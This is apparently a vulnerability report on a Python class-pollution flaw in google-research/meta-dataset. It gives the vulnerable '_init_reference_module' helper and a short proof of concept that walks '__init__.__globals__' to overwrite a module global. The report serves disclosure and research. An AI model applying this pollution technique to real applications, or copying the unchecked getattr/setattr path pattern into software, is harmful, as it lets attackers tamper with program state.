## meta_dataset

### Meta

+ Library: meta_dataset
+ Stars: 768
+ Version: N/A
+ CVE: N/A
+ Status: Pending
+ Payload: ```_init_reference_module(Animal, {"typ":'cat',"age": 11}, [['__init__','__globals__','__name__']], ['polluted'])```
+ Foundby: Zhong
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/google-research/meta-dataset

### Vulnerable Code Snippet

```python
def _init_reference_module(module_cls, module_init_kwargs, paths, variables):
  """Create a mock `module_cls` instance with `variables` as attributes."""
  reference_module = _init_module(module_cls, module_init_kwargs)

  # Manually set attributes of this module via `getattr` and `setattr`.
  for path, variable in zip(paths, variables):
    descoped_module = reparameterizable_base.chained_getattr(
        reference_module, path[:-1])
    reparameterizable_base.corner_case_setattr(descoped_module, path[-1],
                                               variable)

  return reference_module
```
### PoC

```python
from meta_dataset.models.experimental.reparameterizable_base_test import _init_reference_module
import subprocess
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)


_init_reference_module(Animal, {"typ":'cat',"age": 11}, [['__init__','__globals__','__name__']], ['polluted'])
print(__name__)
```